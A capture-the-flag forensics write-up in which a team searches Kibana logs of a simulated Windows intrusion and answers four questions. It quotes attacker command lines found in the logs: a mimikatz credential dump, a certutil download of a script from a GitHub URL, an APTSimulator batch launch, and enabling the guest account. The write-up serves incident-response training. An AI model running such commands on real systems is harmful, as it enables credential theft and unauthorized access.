# Hunting into the wild (forensics, 972p, 27 solved)

## Description

```  
We received a report from our colleagues that one of the computers started
behaving strangely and our analyst limited the investigation (based on
interviews with the employees) for the period 3.12.2020 - 4.12.2020 when he
thinks the malicious events were triggered in the network system. Can you
please help us learn more about the situation?

Q1. Some corrupted employees tried to dump admin passwords, using a popular
script among hackers, but we don’t know exactly its name. Can you help us in
the investigation? Flag format: CTF{process_name}

Q2. For us, it’s very difficult to make the difference between a legit and a
malicious command using Windows native tools. Can you please identify what
command was used by the attacker when downloading the malware on our system?
Flag format: command line used by the attacker

Q3. We also know that the attackers used multiple attacking persistent threats
& scripts when attacked our systems. Can you please help us determine what is
the name of the initial script used for performing the attack? Flag format:
CTF{script_name)

Q4. Victims to these attacks reported that a new admin account was created on
their operating machines. What is the command used by the attacker to activate
the new account? Flag format: command line  
```

In the task we get an archive with ELK stack deployment with some indexed data
(not attached).

## Initial setup

Unpack, docker-compose up and hope for the best.

## Searching through logs

The idea of this task is to query Kibana and find answers to the questions.  
This is actually a really nice and practical task!

### Q1

We suspect the tool used is `mimikatz` and there is for example
`sekurlsa::LogonPasswords` command.  
Looking for that we find:

```  
C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt  
```

So the answer is `ctf{mim.exe}`

### Q2

This was the hardest one, because it's very unclear what is `malware` in this
context, and at which point.  
It was clear that there was this `APTSimulator` toolset on the machine, so we
guessed we need to figure out where did it come from.  
Finally we pinpointed:

```  
certutil.exe  -urlcache -split -f
https://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js
C:\Users\Public\en-US.js  
```

which passed as flag.

### Q3

If we look for first references to `APTSimulator` we can find:

```  
C:\Windows\system32\cmd.exe /c
""""C:\Users\IEUser\Desktop\APTSimulator\APTSimulator.bat  
```

So `ctf{APTSimulator.bat}`

### Q4

We first checked how account can actually be activated on windows via `net
user` and the command is `/active:yes` and looking for that gave us:

```  
net user guest /active:yes  
```

which validated as last flag.

Original writeup
(https://github.com/TFNS/writeups/tree/master/2020-12-05-DefCampCTF/hunting).